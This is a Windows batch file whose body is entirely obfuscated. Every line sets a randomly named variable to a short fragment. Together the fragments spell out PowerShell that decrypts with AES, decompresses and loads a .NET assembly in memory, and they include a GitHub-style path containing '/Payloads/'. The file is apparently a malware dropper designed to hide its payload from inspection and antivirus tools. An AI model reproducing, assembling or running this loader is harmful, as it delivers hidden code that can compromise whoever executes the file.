@echo off
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "iMRfZCJGyy=Mode"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "bPLBwYlEAa=@','"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wcsYCyHKvI=spli"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ufunIwwgVr=nt;i"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wNxftrmeMG=rity"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "zTlFGbvSBn=$b,0"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "GwfOPFTMXe=ring"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "lAeHVRXPyj=');$"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "BxFzIwEGXo=v;$c"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "lFiDdgisdq=pyTo"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "MirPeoFVKH=exe""
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "tnhtBaVcED=ndow"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "GFZaaCCzMo==$k;"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "rawhbbaOWW=$r};"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "OoeqEHcMLt=o.Di"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "mKQhCvXoDu=bjec"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "PNnmrWlcGz=/ref"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "PSMwqGeOQm=v1.0"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "RlLqmJJeJu=nver"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "eNaizILgTf=ersh"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TKCJhrzPbV=() -"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "QxsImsmPjj=ispo"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wqDIITzcrh=e('#"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "IYIOGHIcwT=' -U"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "PPjdcsSqUX=.Com"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "qhfsRUvShg=sion"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "eVrhFsDiTW=ent."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "BYMOZYppzE=].Re"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "YdPjmuLoMI=ion "
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wbBWoDbTKn=_KEY"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "IeVrHYmUqF=nver"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "SuOWvXgavv=O.Me"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "UQSGJYEram=Repl"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "MleKBzlYvE=/Pay"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "UFQpEYxnik=ect "
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "HopcjmgXeh=ting"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "EidrGEeFLt=s/he"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "sbONekTnHa=Crea"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "fZLiPisaNT=){$k"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "CqINqJYvmb=g='P"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "uFAIwsHNtP=BASE"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ZPyTqmYeWx=ace("
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TaAOEIJFTU=([Co"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "QFDinInbIk=$b2="
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "fiIZGkWSuI=::Fr"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "yyCpowmjyx=b2 $"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TOhYAcplfG=unct"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "EUbYywBlnL=$c.D"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "pZVkpmwqCQ=t]$a"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "jqFVjkeQdc=)));"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "UBaymvxxPh=$a=["
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "JxiwlGPcca=func"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "zyHbVQtsfT=64St"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "WzZoWzMEnO=t '\"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "tJSjPKVGoF=IO.C"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "YMWMfQWTpn=ES_I"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ZAUdgzmCLl=Disp"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "BOkloLbVbq=thub"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wrCkqkgCoY=spos"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "SmguIcAtuP=sm=["
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "JtqrjqMFDR=ing("
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ChnQWDotCy=mory"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TRFioHrdxU=ecom"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ONyKnAXEvh=ock("
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "hXBMKjDqvF==z(d"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "BWCGrENnaA=.Dis"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ZQDfRbhCwA= @()"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "DhSRiMCREM=($p["
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "QAeqoBpunS=Stri"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "WxKiVqcBhQ=64St"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "gfxvCzJUeN=e($n"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ucMIeqdQUu=cryp"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "nDSkoxnTMR=};fu"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "mkSlIkvdgf=epla"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "zrYCAGWfWW=main"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ggajfxdZHI=New-"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "YDmOezZpuJ=args"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "jtvfquYMhZ=mFin"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "hRzxkIrgZe=ew-O"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "JJNmgqcbtE=cont"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "zmXsXWWMQd=ce('"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TNMYsoKZup=ads/"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "jByHPjMNJQ==[Co"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "WEQGFruqgJ=ng('"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "EemkzajeUy=romB"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "nBOsvOIGij=#','"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "kYoeLHINCG=Secu"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "lTngDFalbt=a.Pa"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ySNzFGFqcD=0].R"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "lTQgQRoPNQ=am(,"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "qCvmKPANbl=));e"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "peeAELkUQI=rray"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "MqIhuqczqS=::Lo"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "GaDqKdORvl={$i="
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ksFrpjvIfc=b,$a"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "bGuVOjWhAC=ase6"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "FtBmQfmeha=ull,"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oUwziVRcEJ=p){$"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "QetFNXEcRD=ring"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wKljwYyjqf=b);$"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "rJOIAggkyK=echo"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "JZBwpoKsnU=Dude"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "mrsOdOcBdR=){$a"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "tHOZWxmpTP=.ToA"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "FjBWUcPIrm=='CB"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "pldSKRyVZG=r=$o"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "IDaloIDMDm=))}}"
